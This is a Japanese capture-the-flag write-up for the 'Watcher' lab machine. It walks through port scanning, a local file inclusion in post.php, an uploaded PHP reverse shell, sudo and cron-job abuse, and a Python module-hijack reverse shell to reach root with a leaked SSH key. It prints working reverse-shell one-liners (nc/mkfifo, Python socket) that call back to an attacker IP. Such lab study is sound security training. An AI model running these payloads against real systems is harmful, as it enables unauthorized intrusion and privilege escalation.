# Watcher CTF

<URL>

## Enumeration

```shell
TARGET=10.201.56.186
sudo bash -c "echo $TARGET   watcher.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -sS -p- $TARGET

PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

```sh
sudo nmap -sS -sV -p21,22,80 $TARGET

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

FTP, SSH, HTTP。  
FTP は Anonymous でログインできなかった。

### ディレクトリ列挙

```sh
root@ip-10-201-32-175:~# dirb http://watcher.thm

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Oct 21 05:49:54 2025
URL_BASE: http://watcher.thm/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://watcher.thm/ ----
==> DIRECTORY: http://watcher.thm/css/                                                                              
==> DIRECTORY: http://watcher.thm/images/                                                                           
+ http://watcher.thm/index.php (CODE:200|SIZE:4826)                                                                 
+ http://watcher.thm/robots.txt (CODE:200|SIZE:69)                                                                  
+ http://watcher.thm/server-status (CODE:403|SIZE:276)                                                              
                                                                                                                    
---- Entering directory: http://watcher.thm/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                    
---- Entering directory: http://watcher.thm/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
```

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

root@ip-10-201-32-175:~# gobuster dir -q -x=txt,php -u http://$TARGET -w ./dirlist.txt -t 64 -k
/bunch.php            (Status: 200) [Size: 3445]
/css                  (Status: 301) [Size: 312] [--> http://10.201.56.186/css/]
/images               (Status: 301) [Size: 315] [--> http://10.201.56.186/images/]
/index.php            (Status: 200) [Size: 4826]
/post.php             (Status: 200) [Size: 2422]
/robots.txt           (Status: 200) [Size: 69]
/robots.txt           (Status: 200) [Size: 69]
/round.php            (Status: 200) [Size: 3440]
```

## フラグ１ robots.txt

robots.txt

```txt
User-agent: *
Allow: /flag_1.txt
Allow: /secret_file_do_not_read.txt
```

## フラグ２ LFI

分かりやすいLFIが存在する。

http://watcher.thm/post.php?post=/etc/passwd

```sh
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
will:x:1000:1000:will:/home/will:/bin/bash
ftp:x:111:114:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
ftpuser:x:1001:1001:,,,:/home/ftpuser:/usr/sbin/nologin
mat:x:1002:1002:,#,,:/home/mat:/bin/bash
toby:x:1003:1003:,,,:/home/toby:/bin/bash
systemd-timesync:x:112:115:systemd Time
Synchronization,,,:/run/systemd:/usr/sbin/nologin
tss:x:113:118:TPM software stack,,,:/var/lib/tpm:/bin/false
tcpdump:x:114:119::/nonexistent:/usr/sbin/nologin
usbmux:x:115:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
fwupd-refresh:x:116:120:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ubuntu:x:1004:1005:Ubuntu:/home/ubuntu:/bin/bash
```

php://filter/convert.base64-encode/resource=/etc/passwd の形も成功する。

SSH秘密鍵は失敗。

```
php://filter/convert.base64-encode/resource=/home/will/.ssh/id_rsa
php://filter/convert.base64-encode/resource=/home/mat/.ssh/id_rsa
php://filter/convert.base64-encode/resource=/home/toby/.ssh/id_rsa
```

robots.txt に記載されていたシークレットファイル。

http://watcher.thm/post.php?post=secret_file_do_not_read.txt

```
Hi Mat, The credentials for the FTP server are below. I've set the files to be saved to /home/ftpuser/ftp/files. Will ---------- ftpuser:[REDACTED]
```

FTP接続。フラグ２発見。filesディレクトリは空だった。

```sh
ftp> ls -al
229 Entering Extended Passive Mode (|||47202|)
150 Here comes the directory listing.
dr-xr-xr-x    3 65534    65534        4096 Dec 03  2020 .
dr-xr-xr-x    3 65534    65534        4096 Dec 03  2020 ..
drwxr-xr-x    2 1001     1001         4096 Dec 03  2020 files
-rw-r--r--    1 0        0              21 Dec 03  2020 flag_2.txt
```

filesディレクトリにPHPをアップロードしてリバースシェル取得。

```sh
$ nc -lnvp 8888
listening on [any] 8888 ...
connect to [10.11.146.32] from (UNKNOWN) [10.201.56.186] 44664
Linux ip-10-201-56-186 5.15.0-138-generic #148~20.04.1-Ubuntu SMP Fri Mar 28 14:32:35 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 05:42:39 up 56 min,  0 users,  load average: 0.02, 0.04, 0.41
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## フラグ３ www-data

/var/www/html の中に隠しディレクトリ発見。

```sh
www-data@ip-10-201-56-186:/$ ls -al /var/www/html
total 60
drwxr-xr-x 5 root root 4096 Dec  3  2020 .
drwxr-xr-x 3 root root 4096 Dec  3  2020 ..
-rw-r--r-- 1 root root   47 Dec  3  2020 .htaccess
-rw-r--r-- 1 root root 3445 Dec  3  2020 bunch.php
drwxr-xr-x 2 root root 4096 Dec  3  2020 css
-rw-r--r-- 1 root root   35 Dec  3  2020 flag_1.txt
drwxr-xr-x 2 root root 4096 Dec  3  2020 images
-rw-r--r-- 1 root root 4826 Dec  3  2020 index.php
drwxr-xr-x 2 root root 4096 Dec  3  2020 more_secrets_a9f10a
-rw-r--r-- 1 root root 2454 Dec  3  2020 post.php
-rw-r--r-- 1 root root   69 Dec  3  2020 robots.txt
-rw-r--r-- 1 root root 3440 Dec  3  2020 round.php
-rw-r--r-- 1 root root  156 Dec  3  2020 secret_file_do_not_read.txt
-rw-r--r-- 1 root root 3446 Dec  3  2020 striped.php
```

```sh
www-data@ip-10-201-56-186:/$ ls -al /var/www/html/more_secrets_a9f10a
total 12
drwxr-xr-x 2 root root 4096 Dec  3  2020 .
drwxr-xr-x 5 root root 4096 Dec  3  2020 ..
-rw-r--r-- 1 root root   21 Dec  3  2020 flag_3.txt
```

/home を列挙

```sh
www-data@ip-10-201-56-186:/home$ ls -al /home/mat
total 312
drwxr-xr-x 6 mat  mat    4096 Dec  3  2020 .
drwxr-xr-x 7 root root   4096 Oct 21 04:46 ..
lrwxrwxrwx 1 root root      9 Dec  3  2020 .bash_history -> /dev/null
-rw-r--r-- 1 mat  mat     220 Dec  3  2020 .bash_logout
-rw-r--r-- 1 mat  mat    3771 Dec  3  2020 .bashrc
drwx------ 2 mat  mat    4096 Dec  3  2020 .cache
drwx------ 3 mat  mat    4096 Dec  3  2020 .gnupg
drwxrwxr-x 3 mat  mat    4096 Dec  3  2020 .local
-rw-r--r-- 1 mat  mat     807 Dec  3  2020 .profile
-rw-r--r-- 1 mat  mat  270433 Dec  3  2020 cow.jpg
-rw------- 1 mat  mat      37 Dec  3  2020 flag_5.txt
-rw-r--r-- 1 will will    141 Dec  3  2020 note.txt
drwxrwxr-x 2 will will   4096 Dec  3  2020 scripts

www-data@ip-10-201-56-186:/home$ ls -al /home/toby
total 44
drwxr-xr-x 6 toby toby 4096 Dec 12  2020 .
drwxr-xr-x 7 root root 4096 Oct 21 04:46 ..
lrwxrwxrwx 1 root root    9 Dec  3  2020 .bash_history -> /dev/null
-rw-r--r-- 1 toby toby  220 Dec  3  2020 .bash_logout
-rw-r--r-- 1 toby toby 3771 Dec  3  2020 .bashrc
drwx------ 2 toby toby 4096 Dec  3  2020 .cache
drwx------ 3 toby toby 4096 Dec  3  2020 .gnupg
drwxrwxr-x 3 toby toby 4096 Dec  3  2020 .local
-rw-r--r-- 1 toby toby  807 Dec  3  2020 .profile
-rw------- 1 toby toby   21 Dec  3  2020 flag_4.txt
drwxrwxr-x 2 toby toby 4096 Dec  3  2020 jobs
-rw-r--r-- 1 mat  mat    89 Dec 12  2020 note.txt

www-data@ip-10-201-56-186:/home$ ls -al /home/will
total 36
drwxr-xr-x 5 will will 4096 Dec  3  2020 .
drwxr-xr-x 7 root root 4096 Oct 21 04:46 ..
lrwxrwxrwx 1 will will    9 Dec  3  2020 .bash_history -> /dev/null
-rw-r--r-- 1 will will  220 Dec  3  2020 .bash_logout
-rw-r--r-- 1 will will 3771 Dec  3  2020 .bashrc
drwx------ 2 will will 4096 Dec  3  2020 .cache
drwxr-x--- 3 will will 4096 Dec  3  2020 .config
drwx------ 3 will will 4096 Dec  3  2020 .gnupg
-rw-r--r-- 1 will will  807 Dec  3  2020 .profile
-rw-r--r-- 1 will will    0 Dec  3  2020 .sudo_as_admin_successful
-rw------- 1 will will   41 Dec  3  2020 flag_6.txt
```

toby, mat, will の順。

## フラグ４ toby

Mat -> Toby へ宛てたメッセージ。Matへの昇格にかかわると思われる。

```sh
www-data@ip-10-201-56-186:/home/toby$ cat note.txt
Hi Toby,

I've got the cron jobs set up now so don't worry about getting that done.

Mat
```

```sh
www-data@ip-10-201-56-186:/home/toby$ ls -al jobs
total 12
drwxrwxr-x 2 toby toby 4096 Dec  3  2020 .
drwxr-xr-x 6 toby toby 4096 Dec 12  2020 ..
-rwxr-xr-x 1 toby toby   46 Dec  3  2020 cow.sh
www-data@ip-10-201-56-186:/home/toby$ cat jobs/cow.sh
#!/bin/bash
cp /home/mat/cow.jpg /tmp/cow.jpg
```

/etc/crontab

```sh
# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
*/1 * * * * mat /home/toby/jobs/cow.sh
```

sudoで無制限でtobyになれる。

```sh
www-data@ip-10-201-56-186:/home/toby$ sudo -l
Matching Defaults entries for www-data on ip-10-201-56-186:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-201-56-186:
    (toby) NOPASSWD: ALL
```

昇格成功。

```sh
www-data@ip-10-201-56-186:/home/toby$ sudo -u toby bash -p
toby@ip-10-201-56-186:~$ id
uid=1003(toby) gid=1003(toby) groups=1003(toby)
```

## フラグ５ Mat

ジョブスクリプト書き換え

```sh
toby@ip-10-201-56-186:~$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.146.32 8889 >/tmp/f' > jobs/cow.sh
```

```sh
$ nc -lnvp 8889         
listening on [any] 8889 ...
connect to [10.11.146.32] from (UNKNOWN) [10.201.56.186] 36728
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1002(mat) gid=1002(mat) groups=1002(mat)
```

## フラグ６ Will

```sh
mat@ip-10-201-56-186:~$ cat note.txt
Hi Mat,

I've set up your sudo rights to use the python script as my user. You can only run the script with sudo so it should be safe.

Will
```

```sh
mat@ip-10-201-56-186:~$ sudo -l
Matching Defaults entries for mat on ip-10-201-56-186:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mat may run the following commands on ip-10-201-56-186:
    (will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py *
```

```sh
mat@ip-10-201-56-186:~$ ls -al /home/mat/scripts/will_script.py
-rw-r--r-- 1 will will 208 Dec  3  2020 /home/mat/scripts/will_script.py

mat@ip-10-201-56-186:~$ cat /home/mat/scripts/will_script.py
import os
import sys
from cmd import get_command

cmd = get_command(sys.argv[1])

whitelist = ["ls -lah", "id", "cat /etc/passwd"]

if cmd not in whitelist:
        print("Invalid command!")
        exit()

os.system(cmd)
```

scripts ディレクトリの中に cmd.py を配置する。

```sh
mat@ip-10-201-56-186:~$ cat cmd.py
# cmd.py

def get_command(dummy):
    import socket,subprocess,os;
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
    s.connect(("10.11.146.32",8890));
    os.dup2(s.fileno(),0);
    os.dup2(s.fileno(),1);
    os.dup2(s.fileno(),2);
    import pty;
    pty.spawn("/bin/sh")
    return "id"
```

```sh
$ nc -lnvp 8890
listening on [any] 8890 ...
connect to [10.11.146.32] from (UNKNOWN) [10.201.56.186] 54456
$ id
id
uid=1000(will) gid=1000(will) groups=1000(will),4(adm)
```

## フラグ７ root

sudo はパスワードが必要。admグループに注目。

```sh
will@ip-10-201-56-186:~$ id
uid=1000(will) gid=1000(will) groups=1000(will),4(adm)
```

admグループのファイルを検索。怪しいバックアップファイル。

```sh
will@ip-10-201-56-186:~$ find / -group adm -type f -not -path "/proc/*" 2>/dev/null
/opt/backups/key.b64
/var/log/dmesg.3.gz
...
```

```sh
will@ip-10-201-56-186:~$ cat /opt/backups/key.b64
LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcEFJQkFBS0NBUUVBelBhUUZvbFFx
[REDACTED]
LUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo=
```

base64デコードしたら、秘密鍵になった。

```sh
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAzPaQFolQq8cHom9mssyPZ53aLzBcRyBw+rysJ3h0JCxnV+aG
[REDACTED]
4APxI1DxU+a2xXXf02dsQH0H5AhNCiTBD7I5YRsM1bOEqjFdZgv6SA==
-----END RSA PRIVATE KEY-----
```

rootでSSH接続できた。

```sh
$ ssh root@$TARGET -i ./id_rsa                                        

root@ip-10-201-56-186:~# id
uid=0(root) gid=0(root) groups=0(root)
```

## 振り返り

- 一番時間がかかったのは、/secret_file_do_not_read.txt をLFIで読むところ。`http://watcher.thm/secret_file_do_not_read.txt` で読めなかったのでそのファイルは存在しないと思っていた。404 ではなく 403 Forbidden に気づかなかったのは不注意だった。

下記のようにアクセス制限を設定されていた。盲点。

```sh
root@ip-10-201-56-186:~# cat /var/www/html/.htaccess
RedirectMatch 403 /secret_file_do_not_read.txt
```
